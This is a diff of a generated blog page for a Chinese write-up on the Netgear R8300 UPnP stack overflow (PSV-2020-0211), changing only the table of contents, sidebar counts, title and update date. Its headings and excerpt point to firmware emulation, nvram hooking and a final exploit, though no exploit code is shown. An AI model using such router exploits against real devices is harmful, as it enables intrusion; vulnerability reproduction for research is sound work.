-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PSV-2020-0211-Netgear-R8300-UPnP-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu模拟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.4.</span> <span class="toc-text">hook操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nvram%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">nvram是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hook%E6%B5%81%E7%A8%8B%E7%9A%84%E6%A2%B3%E7%90%86"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">Hook流程的梳理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EXP%E7%BC%96%E5%86%99"><span class="toc-number">1.4.</span> <span class="toc-text">| 3 | EXP编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9C%80%E7%BB%88EXP"><span class="toc-number">1.5.</span> <span class="toc-text">| 4 | 最终EXP</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PSV-2020-0211-Netgear-R8300-UPnP-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu模拟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.4.</span> <span class="toc-text">hook操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nvram%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">nvram是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hook%E6%B5%81%E7%A8%8B%E7%9A%84%E6%A2%B3%E7%90%86"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">Hook流程的梳理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9C%80%E7%BB%88EXP"><span class="toc-number">1.4.</span> <span class="toc-text">| 4 | 最终EXP</span></a></li></ol></li></ol>
       
   </div>
 </div>
@@ -606,15 +580,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -751,13 +725,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "zer00ne",
-          title: "PSV-2020-0211",
+          title: "PSV-2020-0211 栈溢出漏洞",
           url: "https://khighl.github.io.git/2025/07/10/PSV-2020-0211%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/",
           excerpt: "",
           description: "",
           stripContent: "PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞| 0 | 前言本次的漏洞复现比较特殊的是环境搭建中的 hook操作,属于 iot安全研究中一个很巧妙的手法 我通过这个漏洞展现一个如何通过 hook绕过一些硬件的检测 | 1 | 环境搭建1.1 下载官方提供了固件的下载,根据官网漏洞报告于 V1.0.2.134 中修复了该漏洞,所以可以选取任意之前的版本,我选择的是 V1.0.2.130 下载地址 : netgear R8300 解包依旧使用 binwalk解包 1b",
           date: "Thu Jul 10 2025 00:00:00 GMT+0800",
-          updated: "Thu Jul 10 2025 13:53:51 GMT+0800",
+          updated: "Tue Mar 24 2026 09:55:12 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
